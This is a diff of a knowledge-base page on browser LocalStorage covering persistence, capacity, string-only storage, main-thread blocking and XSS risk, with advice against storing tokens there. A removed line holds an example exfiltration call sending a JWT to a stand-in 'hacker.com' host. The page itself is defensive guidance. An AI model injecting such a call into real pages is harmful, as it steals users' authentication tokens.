@@ -1,27 +1,39 @@
 ---
 title: LocalStorage
-description: A modern HTML5 Web Storage API providing persistent, synchronous, key-value storage directly within the browser.
+description: A synchronous Web Storage API allowing web applications to persistently store simple key-value string data directly in the browser across sessions.
 ---
 import { ConceptTemplate } from '@/features/kb/components/templates/ConceptTemplate'
+import { ComparisonTable } from '@/features/kb/components/mdx/ComparisonTable'
+import { Callout } from '@/features/kb/components/mdx/Callout'
 
 <ConceptTemplate title="LocalStorage">
 
-Cookies are terrible for storing application data. They have a 4KB limit, and because the browser automatically attaches them to every single HTTP request, storing 4KB of data in a cookie means wasting 4KB of network bandwidth on every single image, CSS file, and API call.
+While Cookies are heavily tied to HTTP requests and servers, **LocalStorage** is a pure Client-Side storage mechanism. It allows JavaScript to save data directly into the browser's hard drive without ever sending it to the backend server.
 
-HTML5 introduced the **Web Storage API**, specifically **LocalStorage**, to solve this.
-
-## How it Works
-LocalStorage provides a simple, synchronous Key-Value store in the browser. 
+## 1. Persistent Key-Value Storage
+LocalStorage is incredibly simple. It operates as a synchronous dictionary (Key-Value store). 
 - `localStorage.setItem('theme', 'dark')`
-- `localStorage.getItem('theme')`
+- `const theme = localStorage.getItem('theme')`
 
-## Key Features
-1. **Large Capacity**: Allows storing up to 5MB of data per domain (compared to the 4KB Cookie limit).
-2. **Never Sent to Server**: LocalStorage data is strictly client-side. It is never automatically attached to HTTP headers, saving massive amounts of bandwidth.
-3. **Persistence**: Data in LocalStorage has no expiration date. It persists even if the user completely closes the browser and reboots their computer. It is only cleared if the user manually wipes their browser cache.
+Critically, LocalStorage is **persistent**. If the user closes the tab, closes the browser, or restarts their computer, the data remains perfectly intact forever (until explicitly deleted by JavaScript or the user clearing their browser cache).
 
-<Callout icon="warning" title="The Security Flaw">
-  LocalStorage does not have an `HttpOnly` equivalent. It is 100% accessible to JavaScript. Therefore, **you must never store JWTs or Authentication Tokens in LocalStorage**. If your site has a single XSS vulnerability, a hacker can easily write `fetch('hacker.com?token=' + localStorage.getItem('jwt'))` and completely bypass all security.
+## 2. Architecture & Limitations
+<ComparisonTable 
+  headers={['Property', 'Details']} 
+  rows={[
+    ['Capacity', 'Significantly larger than Cookies. Usually 5MB to 10MB per origin.'],
+    ['Data Types', 'Strictly Strings. If you want to store a JSON object, you must use `JSON.stringify()` and `JSON.parse()`.'],
+    ['Network Overhead', 'Zero. Unlike cookies, LocalStorage data is never automatically attached to HTTP requests.'],
+    ['Synchronous Blocking', 'The API is entirely synchronous. Reading a massive 5MB string from LocalStorage will physically block the Main Thread and drop frame rates.']
+  ]} 
+/>
+
+## 3. Security Vulnerabilities (XSS)
+LocalStorage is inherently vulnerable to **Cross-Site Scripting (XSS)**. 
+Because LocalStorage is universally accessible by any JavaScript running on the domain, if a hacker manages to inject a malicious script onto your page, they can trivially execute `console.log(localStorage.getItem('jwt_token'))` and steal the user's authentication credentials. 
+
+<Callout icon="warning" title="Never Store Secrets">
+You must never store highly sensitive information (like JWT Access Tokens, Passwords, or PII) in LocalStorage. For secure authentication sessions, always use HTTP-Only, Secure cookies, which are mathematically immune to XSS token theft.
 </Callout>
 
 </ConceptTemplate>
